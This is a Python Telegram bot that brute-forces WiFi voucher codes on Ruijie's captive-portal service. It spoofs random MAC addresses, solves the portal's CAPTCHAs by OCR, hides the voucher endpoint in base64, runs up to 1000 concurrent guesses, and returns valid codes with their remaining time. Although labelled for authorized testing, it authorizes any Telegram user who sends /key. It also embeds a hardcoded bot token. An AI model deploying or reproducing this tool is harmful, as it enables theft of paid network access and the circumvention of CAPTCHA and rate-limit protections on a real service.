#!/usr/bin/env python3
"""
Ruijie WiFiDog Voucher Brute-Forcer - Auto-Authorize Version
Authorized Penetration Testing Use Only

Anyone who runs /key is automatically authorized.
"""

import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = '8947878806:AAFFK1m2BDS2pzPO3QHM0QcbaiN06Fmi1wg'
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
session = None
_connector = None
CONCURRENCY = 1000
_voucher_sem = None
_start_time = time.monotonic()
user_data = {}

# ─── Cached OCR engine ──────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    thresh = cv2.adaptiveThreshold(
        gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
        cv2.THRESH_BINARY, 11, 2
    )
    denoised = cv2.fastNlMeansDenoising(thresh, h=30)
    _, buffer = cv2.imencode('.png', denoised)
    result = _ocr.classification(buffer.tobytes())
    return result.upper() if result else None

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

# ─── Session Manager ────────────────────────────────────────────────────────

class ScanSession:
    """Reusable session per scan task."""
    __slots__ = ('session', 'connector', 'session_url', 'chat_id', 'scan_id')
    
    def __init__(self, session_url, chat_id, scan_id):
        self.session_url = session_url
        self.chat_id = chat_id
        self.scan_id = scan_id
        conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
        self.connector = conn
        self.session = aiohttp.ClientSession(
            connector=conn,
            connector_owner=True,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=20)
        )
    
    async def close(self):
        await self.session.close()
        await self.connector.close()
    
    async def get_session_id(self, previous_session_id=None):
        first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
        mac = ':'.join(f'{random.randint(0x00, 0xff):02x}' if i > 0 else f'{first_byte:02x}'
                       for i in range(6))
        url = re.sub(r'(?<=mac=)[^&]+', mac, self.session_url)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        try:
            async with self.session.get(url, headers=headers, allow_redirects=True) as resp:
                text_ = str(resp.url)
                match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", text_)
                if match:
                    return match.group(1)
        except Exception as e:
            print(f"[get_session_id] error: {e}")
        return previous_session_id
    
    async def get_captcha_image(self, session_id):
        params = {'sessionId': session_id, '_t': str(time.time())}
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36',
            'accept': 'image/avif,image/webp,image/apng,*/*',
            'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        }
        async with self.session.get(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
            params=params, headers=headers
        ) as resp:
            return await resp.read()
    
    async def verify_captcha(self, session_id, auth_code):
        headers = {
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36',
            'origin': 'https://portal-as.ruijienetworks.com',
            'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        }
        payload = {'sessionId': session_id, 'authCode': auth_code}
        async with self.session.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            headers=headers, json=payload
        ) as resp:
            data = await resp.json()
            return data.get("success") == True
    
    async def solve_captcha(self, session_id, max_attempts=3):
        for _ in range(max_attempts):
            img_bytes = await self.get_captcha_image(session_id)
            text = await Captcha_Text(img_bytes)
            if text and await self.verify_captcha(session_id, text):
                return text
        return None


# ─── Core voucher check ─────────────────────────────────────────────────────

async def perform_check(scan_ss: ScanSession, code: str, chat_id: int,
                        scan_id: str, message=None, recheck=False):
    if not recheck:
        task = scan_tasks.get(chat_id)
        if not task or task.get("scan_id") != scan_id or task.get("stop"):
            return None

    session_id = await scan_ss.get_session_id()
    if not session_id:
        return None

    auth_code = await scan_ss.solve_captcha(session_id, max_attempts=2)
    if not auth_code:
        return None

    if not recheck:
        task = scan_tasks.get(chat_id)
        if not task or task.get("scan_id") != scan_id or task.get("stop"):
            return None

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()
    headers = {
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
    }
    payload = {
        "accessCode": code,
        "sessionId": session_id,
        "apiVersion": 1,
        "authCode": auth_code,
    }

    for attempt in range(2):
        try:
            async with scan_ss.session.post(post_url, json=payload, headers=headers) as resp:
                response = await resp.text()
                resp_json = json.loads(response)
        except Exception as e:
            print(f"[check] code={code} exception: {e}")
            return None

        if 'request limited' in response:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            await asyncio.sleep(0.5 * (attempt + 1))
            continue
        break
    else:
        return None

    if 'logonUrl' in response:
        if recheck:
            return code
        
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(scan_ss, session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(
                        chat_id, f"✅ Success Codes:\n\n{code_line}",
                        reply_markup=main_menu()
                    )
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=success_messages[chat_id],
                            text=f"✅ Success Codes:\n\n{code_line}",
                            reply_markup=main_menu()
                        )
                    except Exception:
                        sent = await bot.send_message(
                            chat_id, f"✅ Success Codes:\n\n{code_line}",
                            reply_markup=main_menu()
                        )
                        success_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"[success_msg] error: {e}")
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(scan_ss, session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id, f"⚠️ Limited Codes:\n\n{limited_line}",
                        reply_markup=main_menu()
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=limited_messages[chat_id],
                            text=f"⚠️ Limited Codes:\n\n{limited_line}",
                            reply_markup=main_menu()
                        )
                    except Exception:
                        sent = await bot.send_message(
                            chat_id, f"⚠️ Limited Codes:\n\n{limited_line}",
                            reply_markup=main_menu()
                        )
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"[limited_msg] error: {e}")
    return None


async def Code_Expires_Date(scan_ss: ScanSession, session_id: str):
    headers = {
        'accept': 'application/json',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={session_id}',
    }
    try:
        async with scan_ss.session.get(
            f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
            headers=headers
        ) as resp:
            data = await resp.json()
            profile = data.get('result', {}).get('profileName', 'Unknown')
            total_mins = data.get('result', {}).get('totalMinutes', 'Unknown')
            if total_mins != 'Unknown':
                h, m = divmod(int(total_mins), 60)
                time_str = f"{h}h {m}m" if h else f"{m}m"
            else:
                time_str = 'Unknown'
            return f"📋 Plan: {profile} | ⏳ Time: {time_str}"
    except Exception as e:
        print(f"[balance] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"


# ─── Run brute-force ────────────────────────────────────────────────────────

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    scan_ss = ScanSession(session_url, chat_id, scan_id)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                limited_messages.pop(chat_id, None)
                limited_texts.pop(chat_id, None)
                retry_counts.pop(chat_id, None)
                return

            batch = []
            for _ in range(2000):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(
                        scan_ss, code, chat_id, scan_id, message=message
                    )

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(checked, total, speed, found, retries)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=text,
                    reply_markup=main_menu()
                )
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text, reply_markup=main_menu())
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"[progress] error: {err}")

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "✅ Scanning Completed\n\n"
                f"📦Checked : {checked:,}\n"
                f"✅Found : {final_found}\n"
                f"🔁Retry : {final_retries}\n"
                "📊Progress : 100%\n"
                "[████████████████████]"
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text,
                    reply_markup=main_menu()
                )
            except:
                pass

    finally:
        await scan_ss.close()
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)


# ─── UI ─────────────────────────────────────────────────────────────────────

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPsite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔑 /key", callback_data="menu_key"),
        InlineKeyboardButton("📥 /input", callback_data="menu_input"),
        InlineKeyboardButton("🔍 /scan", callback_data="menu_scan"),
        InlineKeyboardButton("🔄 /recheck", callback_data="menu_recheck"),
        InlineKeyboardButton("📋 /result", callback_data="menu_result"),
        InlineKeyboardButton("⏹ /stop", callback_data="menu_stop"),
        InlineKeyboardButton("📊 /status", callback_data="menu_status"),
        InlineKeyboardButton("❓ Help", callback_data="menu_help")
    )
    return markup

def scan_mode_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("6-digit", callback_data="scan_6"),
        InlineKeyboardButton("7-digit", callback_data="scan_7"),
        InlineKeyboardButton("8-digit", callback_data="scan_8"),
        InlineKeyboardButton("ascii-lower", callback_data="scan_ascii"),
        InlineKeyboardButton("all (a-z0-9)", callback_data="scan_all"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return markup

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(
        message,
        "🤖 Ruijie Voucher Bot\n\n"
        "အောက်ပါ Menu မှ လိုအပ်သော command ကို ရွေးချယ်ပါ။\n"
        "သို့မဟုတ် command ကို တိုက်ရိုက်ရိုက်ထည့်နိုင်ပါသည်။\n\n"
        "📌 /key ကိုအရင်နှိပ်ပါ — အလိုအလျောက် authorized ဖြစ်ပါမည်။",
        reply_markup=main_menu()
    )

@bot.message_handler(commands=['menu'])
async def menu_command(message):
    await bot.reply_to(message, "📋 Main Menu", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id

    if call.data == "menu_back":
        await bot.edit_message_text("📋 Main Menu", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_key":
        await bot.edit_message_text("🔑 /key — အတည်ပြုနေပါသည်...", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await handle_key(call.message)
        await call.answer()
        return

    if call.data == "menu_input":
        await bot.edit_message_text("📥 /input <session_url> — Session URL ထည့်သွင်းရန်", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_scan":
        await bot.edit_message_text("🔍 Scan Mode ရွေးချယ်ပါ:", chat_id=chat_id, message_id=msg_id, reply_markup=scan_mode_menu())
        await call.answer()
        return

    if call.data.startswith("scan_"):
        mode_map = {"scan_6": "6", "scan_7": "7", "scan_8": "8", "scan_ascii": "ascii-lower", "scan_all": "all"}
        mode = mode_map.get(call.data, "6")
        await bot.edit_message_text(f"🔍 Scan စတင်နေပါသည်... Mode: {mode}", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        class FakeMessage:
            def __init__(self, cid):
                self.chat = type('obj', (object,), {'id': cid})()
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['scan_mode'] = mode
        # Ensure key is done
        if 'authorized' not in user_data.get(chat_id, {}):
            user_data[chat_id]['authorized'] = True
        await scan(FakeMessage(chat_id), mode)
        await call.answer()
        return

    menu_actions = {
        "menu_recheck": ("🔄 /recheck — Success Code များကို ပြန်လည်စစ်ဆေးရန်", "recheck"),
        "menu_result": ("📋 /result — ရရှိထားသော Success Code များကိုကြည့်ရန်", "result"),
        "menu_stop": ("⏹ /stop — လက်ရှိ scan ကိုရပ်တန့်ရန်", "stop"),
        "menu_status": ("📊 /status — Bot အခြေအနေကြည့်ရန်", "status"),
        "menu_help": (
            "🤖 Ruijie Voucher Bot - Help\n\n"
            "Commands:\n"
            "/start — Bot ကိုစတင်ရန်\n"
            "/menu — Menu ပြသရန်\n"
            "/key — အတည်ပြုရန် (auto-approved)\n"
            "/input <url> — Session URL ထည့်ရန်\n"
            "/scan <6|7|8|ascii-lower|all> — Scan စတင်ရန်\n"
            "/recheck — Success Codes ပြန်စစ်ရန်\n"
            "/result — Success Codes ကြည့်ရန်\n"
            "/stop — Scan ရပ်တန့်ရန်\n"
            "/status — Bot အခြေအနေကြည့်ရန်",
            "help"
        )
    }
    if call.data in menu_actions:
        text, action = menu_actions[call.data]
        await bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        handler_map = {
            "recheck": lambda m: recheck(m),
            "result": lambda m: handle_result(m),
            "stop": lambda m: stop_scan(m),
            "status": lambda m: status(m),
        }
        if action in handler_map:
            await handler_map[action](call.message)
        await call.answer()
        return


# ─── /key — Auto-authorize ──────────────────────────────────────────────────

@bot.message_handler(commands=['key'])
async def handle_key(message):
    chat_id = message.chat.id
    # Auto-authorize — no whitelist check, no admin approval
    if chat_id not in user_data:
        user_data[chat_id] = {}
    user_data[chat_id]['authorized'] = True
    await bot.reply_to(
        message,
        "✅ အတည်ပြုပြီးပါပြီ။\n\n"
        "ယခု အောက်ပါ command များကို သုံးနိုင်ပါပြီ:\n"
        "• /input — Session URL ထည့်ရန်\n"
        "• /scan — Voucher code ရှာရန်\n"
        "• /recheck — Code ပြန်စစ်ရန်\n"
        "• /result — ရလဒ်ကြည့်ရန်",
        reply_markup=main_menu()
    )


# ─── /input — Session URL ───────────────────────────────────────────────────

@bot.message_handler(commands=['input'])
async def handle_input(message):
    chat_id = message.chat.id
    # Check authorization
    if chat_id not in user_data or not user_data.get(chat_id, {}).get('authorized'):
        await bot.reply_to(message, "❌ ကျေးဇူးပြု၍ /key ကိုအရင်နှိပ်ပါ။", reply_markup=main_menu())
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/input your_session_url")
        return
    url = args[1]
    await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
    if await check_session_url(url):
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['session_url'] = url
        await bot.reply_to(message, "✅ Session URL အားသိမ်းဆည်းပြီးပါပြီ။\n/scan ဖြင့်စတင်ပါ။", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။", reply_markup=main_menu())


# ─── /scan ──────────────────────────────────────────────────────────────────

@bot.message_handler(commands=['scan'])
async def scan(message, mode=None):
    if mode is None:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(
                message,
                "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>\n\nသို့မဟုတ် Menu မှရွေးချယ်ပါ။",
                reply_markup=scan_mode_menu()
            )
            return
        mode = args[1]
    chat_id = message.chat.id
    # Check authorization
    if chat_id not in user_data or not user_data.get(chat_id, {}).get('authorized'):
        await bot.reply_to(message, "❌ ကျေးဇူးပြု၍ /key ကိုအရင်နှိပ်ပါ။", reply_markup=main_menu())
        return
    if 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "❌ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။", reply_markup=main_menu())
        return
    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ /stop ဖြင့်ရပ်ပါ။", reply_markup=main_menu())
        return
    progress_msg = await bot.send_message(chat_id, "🔍Scanning Codes...\n\n", reply_markup=main_menu())
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}


# ─── /recheck ───────────────────────────────────────────────────────────────

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or not user_data.get(chat_id, {}).get('authorized'):
        await bot.reply_to(message, "❌ ကျေးဇူးပြု၍ /key ကိုအရင်နှိပ်ပါ။", reply_markup=main_menu())
        return
    if 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "❌ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။", reply_markup=main_menu())
        return
    
    # Load results from saved file
    results = await load_results()
    chat_id_str = str(chat_id)
    
    if chat_id_str in results and results[chat_id_str]:
        codes = results[chat_id_str]
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        scan_ss = ScanSession(user_data[chat_id]['session_url'], chat_id, "recheck")
        try:
            recheck_list = []
            for code in codes:
                recode = await perform_check(scan_ss, code, chat_id, scan_id=None, recheck=True, message=message)
                if recode:
                    recheck_list.append(recode)
            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ။ မည်သည့် success code မျှရှာမတွေ့ပါ။"
            await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}", reply_markup=main_menu())
            await save_results(chat_id_str, recheck_list)
        finally:
            await scan_ss.close()
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။", reply_markup=main_menu())


# ─── /result ────────────────────────────────────────────────────────────────

@bot.message_handler(commands=['result'])
async def handle_result(message):
    chat_id = message.chat.id
    if chat_id not in user_data or not user_data.get(chat_id, {}).get('authorized'):
        await bot.reply_to(message, "❌ ကျေးဇူးပြု၍ /key ကိုအရင်နှိပ်ပါ။", reply_markup=main_menu())
        return
    results = await load_results()
    chat_id_str = str(chat_id)
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join(results[chat_id_str])
        await bot.reply_to(message, f"✅ Found Codes:\n{codes}", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။", reply_markup=main_menu())


# ─── /stop ──────────────────────────────────────────────────────────────────

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        await bot.reply_to(message, "⏹ Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "⚠️ ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။", reply_markup=main_menu())


# ─── /status ────────────────────────────────────────────────────────────────

@bot.message_handler(commands=['status'])
async def status(message):
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    authorized_count = sum(1 for u in user_data.values() if u.get('authorized'))
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Authorized Users: {authorized_count}\n"
        f"👥 Total Sessions: {len(user_data)}",
        reply_markup=main_menu()
    )


# ─── Helpers ────────────────────────────────────────────────────────────────

async def check_session_url(session_url):
    headers = {
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            text_ = str(response.url)
            return "sessionId" in text_
    except:
        return False

async def load_results():
    """Load results from local JSON file (no GitHub dependency)."""
    try:
        with open("results.json", "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

async def save_results(chat_id_str, codes_list):
    """Save results to local JSON file."""
    results = await load_results()
    results[chat_id_str] = codes_list
    with open("results.json", "w") as f:
        json.dump(results, f, indent=2)

async def github_update_scheduler():
    """Save SUCCESS_CODE queue to disk periodically."""
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            results = await load_results()
            for item in items:
                chat_id = str(item["chat_id"])
                code = item["code"]
                if chat_id not in results:
                    results[chat_id] = []
                if code not in results[chat_id]:
                    results[chat_id].append(code)
            with open("results.json", "w") as f:
                json.dump(results, f, indent=2)

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        chars = string.digits
        while True:
            yield "".join(random.choice(chars) for _ in range(8))
    if mode == "ascii-lower":
        chars = string.ascii_lowercase
        while True:
            yield "".join(random.choice(chars) for _ in range(6))
    if mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True:
            yield "".join(random.choice(chars) for _ in range(6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"🔁Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Found : {found}\n"
        f"🔁Retry : {retries}\n"
        f"📊Status : running\n"
    )


# ─── Main ───────────────────────────────────────────────────────────────────

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())